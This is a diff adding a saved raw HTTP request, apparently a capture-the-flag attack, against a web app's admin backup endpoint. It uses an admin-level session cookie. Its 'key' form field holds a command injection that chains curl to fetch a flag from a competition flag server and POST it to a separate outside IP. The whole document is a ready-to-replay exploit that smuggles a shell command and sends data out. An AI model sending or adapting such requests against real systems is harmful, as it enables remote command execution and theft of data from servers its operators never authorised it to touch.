@@ -1,0 +1,15 @@
+POST /admin/beifen/ HTTP/1.1
+Host: $IP:5050
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0
+Referer: http://172.19.68.176:5050/admin/beifen/
+Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-US;q=0.7
+Origin: http://172.19.68.176:5050
+Upgrade-Insecure-Requests: 1
+Cookie: session=eyJhZG1pbiI6InJvb3QiLCJjc3JmX3Rva2VuIjoiZmYwYmZjZmJjZWZhNjFhYTFkYmRhMjYyNjEzY2FkNTZjMTFhZTU5NyIsInBvd2VyIjoicm9vdCJ9.aGzcNA.gOZyNCUX8JW6o-oJS1TWZWPKUQk
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Cache-Control: max-age=0
+Content-Type: application/x-www-form-urlencoded
+Accept-Encoding: gzip, deflate
+Content-Length: 330
+
+csrf_token=ImZmMGJmY2ZiY2VmYTYxYWExZGJkYTI2MjYxM2NhZDU2YzExYWU1OTci.aGzcNw.ZQpmL1mErMajL-Xcrj5sANpXuTc&submit=%E7%AB%8B%E5%8D%B3%E5%A4%87%E4%BB%BD%E6%95%B0%E6%8D%AE&key=root+sm2.0+%3E+1.dump%3Bcurl+http%3A%2F%2F10.100.1.12%3A9028%2Fcompetition%2FflagManager%2FgetFlag+%7C+curl+-X+POST+-d+%40-+http%3A%2F%2F170.16.67.9%3A7413%2F%3B
